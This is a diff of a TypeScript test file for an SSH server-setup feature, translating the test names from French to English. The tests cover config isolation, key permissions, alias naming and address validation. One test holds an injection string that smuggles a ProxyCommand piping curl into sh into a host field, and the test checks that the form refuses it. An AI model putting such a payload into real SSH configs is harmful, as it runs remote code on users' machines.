@@ -57,8 +57,8 @@ function pathsIn(data: string): SshPaths {
   return appSshPaths(data, join(data, "home"));
 }
 
-describe("le parcours d'ajout d'un serveur", () => {
-  it("ne modifie jamais le ~/.ssh/config de l'utilisateur", async () => {
+describe("the add-a-server flow", () => {
+  it("never modifies the user's ~/.ssh/config", async () => {
     const { sshConfig } = fakeHome();
     const paths = pathsIn(userData());
     const before = hash(sshConfig);
@@ -102,7 +102,7 @@ describe("le parcours d'ajout d'un serveur", () => {
     expect(readFileSync(sshConfig, "utf8")).toBe(SYSTEM_CONFIG);
   });
 
-  it("écrit tout ce qu'il écrit dans le dossier de données de l'app", async () => {
+  it("writes everything it writes into the app's data folder", async () => {
     const data = userData();
     const paths = pathsIn(data);
 
@@ -125,7 +125,7 @@ describe("le parcours d'ajout d'un serveur", () => {
     expect(statSync(created.server.keyPath ?? "").mode & 0o777).toBe(0o600);
   });
 
-  it("garde la clé publique à portée, avec sa commande ssh-copy-id", async () => {
+  it("keeps the public key within reach, with its ssh-copy-id command", async () => {
     const paths = pathsIn(userData());
 
     const created = await addServer(
@@ -146,8 +146,8 @@ describe("le parcours d'ajout d'un serveur", () => {
   });
 });
 
-describe("un hôte déjà déclaré dans le système", () => {
-  it("n'ouvre ni clé ni bloc de configuration : l'app n'écrit rien pour lui", async () => {
+describe("a host already declared in the system", () => {
+  it("opens no key or configuration block: the app writes nothing for it", async () => {
     const paths = pathsIn(userData());
 
     const created = await addServer(
@@ -170,7 +170,7 @@ describe("un hôte déjà déclaré dans le système", () => {
   });
 });
 
-describe("le nom SSH d'un serveur ajouté", () => {
+describe("the SSH name of an added server", () => {
   const draft = {
     host: "203.0.113.10",
     key: { mode: "generate" } as const,
@@ -179,7 +179,7 @@ describe("le nom SSH d'un serveur ajouté", () => {
     user: "root",
   };
 
-  it("est le mot tapé, mis en forme pour une ligne Host", async () => {
+  it("is the typed word, formatted for a Host line", async () => {
     const paths = pathsIn(userData());
 
     const created = await addServer({ ...draft, slug: "Prod VPS" }, [], paths);
@@ -190,7 +190,7 @@ describe("le nom SSH d'un serveur ajouté", () => {
     );
   });
 
-  it("vient du nom quand rien n'est tapé, et manque quand ce mot est pris", async () => {
+  it("comes from the name when nothing is typed, and is missing when that word is taken", async () => {
     const paths = pathsIn(userData());
 
     const first = await addServer(draft, [], paths);
@@ -207,7 +207,7 @@ describe("le nom SSH d'un serveur ajouté", () => {
     expect(third.server.slug).toBeUndefined();
   });
 
-  it("refuse un mot tapé qui ne tient pas, ou qui désigne déjà une machine", async () => {
+  it("refuses a typed word that does not hold up, or that already names a machine", async () => {
     const paths = pathsIn(userData());
     const held = await addServer({ ...draft, slug: "atelier" }, [], paths);
 
@@ -222,7 +222,7 @@ describe("le nom SSH d'un serveur ajouté", () => {
     ).rejects.toMatchObject({ phrase: { id: "refusal.setup.sshNameTaken" } });
   });
 
-  it("n'en donne pas à un hôte du système, qui est son propre alias", async () => {
+  it("gives none to a system host, which is its own alias", async () => {
     const paths = pathsIn(userData());
 
     const created = await addServer(
@@ -235,8 +235,8 @@ describe("le nom SSH d'un serveur ajouté", () => {
   });
 });
 
-describe("ce que le formulaire refuse", () => {
-  it("dit ce qui ne va pas dans l'adresse, le port et l'utilisateur", async () => {
+describe("what the form refuses", () => {
+  it("says what is wrong with the address, the port and the user", async () => {
     const paths = pathsIn(userData());
     const draft = {
       host: "203.0.113.10",
@@ -257,7 +257,7 @@ describe("ce que le formulaire refuse", () => {
     ).rejects.toBeInstanceOf(SetupError);
   });
 
-  it("refuse une adresse ou un compte qui ajouterait une directive SSH", async () => {
+  it("refuses an address or account that would add an SSH directive", async () => {
     const paths = pathsIn(userData());
     const injection = "x\nProxyCommand curl a.bc|sh";
     const draft = {
@@ -279,7 +279,7 @@ describe("ce que le formulaire refuse", () => {
     ).rejects.toMatchObject({ phrase: { id: "refusal.setup.host" } });
   });
 
-  it("accepte une adresse IPv6", async () => {
+  it("accepts an IPv6 address", async () => {
     const paths = pathsIn(userData());
     const created = await addServer(
       {
@@ -298,7 +298,7 @@ describe("ce que le formulaire refuse", () => {
     );
   });
 
-  it("porte un remède avec son refus", async () => {
+  it("carries a fix with its refusal", async () => {
     const paths = pathsIn(userData());
 
     try {
@@ -321,8 +321,8 @@ describe("ce que le formulaire refuse", () => {
   });
 });
 
-describe("la suppression d'un serveur", () => {
-  it("emporte la clé du dossier de l'app", async () => {
+describe("removing a server", () => {
+  it("takes the key out of the app folder", async () => {
     const paths = pathsIn(userData());
     const created = await addServer(
       {
@@ -344,7 +344,7 @@ describe("la suppression d'un serveur", () => {
   });
 });
 
-describe("l'adresse qu'une épingle appartient à", () => {
+describe("the address a pin belongs to", () => {
   const atelier = {
     host: "203.0.113.10",
     id: "srv-a",
@@ -354,7 +354,7 @@ describe("l'adresse qu'une épingle appartient à", () => {
     user: "root",
   };
 
-  it("est partagée par un autre serveur de l'app au même hôte et au même port", () => {
+  it("is shared by another app server at the same host and port", () => {
     const twin = { ...atelier, id: "srv-b", user: "dev" };
 
     expect(sharesAddress([atelier, twin], atelier, "srv-a")).toBe(true);
@@ -364,7 +364,7 @@ describe("l'adresse qu'une épingle appartient à", () => {
     ).toBe(false);
   });
 
-  it("ne compte pas un hôte du système, dont l'app n'épingle rien", () => {
+  it("does not count a system host, for which the app pins nothing", () => {
     const declared = { ...atelier, id: "srv-c", origin: "system" as const };
 
     expect(sharesAddress([declared], atelier)).toBe(false);
